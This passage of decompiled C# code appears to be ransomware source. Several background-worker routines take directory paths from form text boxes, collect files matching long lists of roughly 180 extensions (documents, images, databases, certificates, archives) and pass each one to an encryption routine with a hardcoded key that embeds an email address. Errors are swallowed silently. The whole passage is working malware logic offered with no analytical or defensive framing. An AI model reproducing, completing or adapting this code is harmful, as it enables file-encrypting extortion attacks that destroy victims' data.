				".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf",
				".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar",
				".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf",
				".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg",
				".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
				".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd",
				".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
				".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf",
				".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql",
				".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2",
				".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm",
				".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx",
				".zip"
			};
			foreach (string item2 in BusarArchivos(text, mExtesiones2))
			{
				RutinaDeCifrado(item2, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Empezar6()
	{
		string text = TextBox10.get_Text();
		string text2 = TextBox11.get_Text();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text);
			IEnumerable<string> mExtesiones = new string[181]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".dll", ".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb",
				".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp",
				".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt",
				".crw", ".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm",
				".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf",
				".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar",
				".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf",
				".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg",
				".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
				".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd",
				".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
				".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf",
				".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql",
				".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2",
				".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm",
				".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx",
				".zip"
			};
			foreach (string item in BusarArchivos(text, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text2);
			IEnumerable<string> mExtesiones2 = new string[181]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".dll", ".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb",
				".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp",
				".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt",
				".crw", ".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm",
				".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf",
				".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar",
				".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf",
				".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg",
				".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
				".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd",
				".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
				".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf",
				".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql",
				".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2",
				".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm",
				".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx",
				".zip"
			};
			foreach (string item2 in BusarArchivos(text2, mExtesiones2))
			{
				RutinaDeCifrado(item2, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void BackgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
	{
		Empezar1();
	}

	private void BackgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
	{
		Empezar3();
	}

	private void BackgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
	{
		Empezar4();
	}

	private void BackgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
	{
		Empezar5();
	}

	private void BackgroundWorker6_DoWork(object sender, DoWorkEventArgs e)
	{
		Empezar6();
	}

	private void BackgroundWorker7_DoWork(object sender, DoWorkEventArgs e)
	{
		string text = TextBox4.get_Text();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text);
			IEnumerable<string> mExtesiones = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item in BusarArchivos(text, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
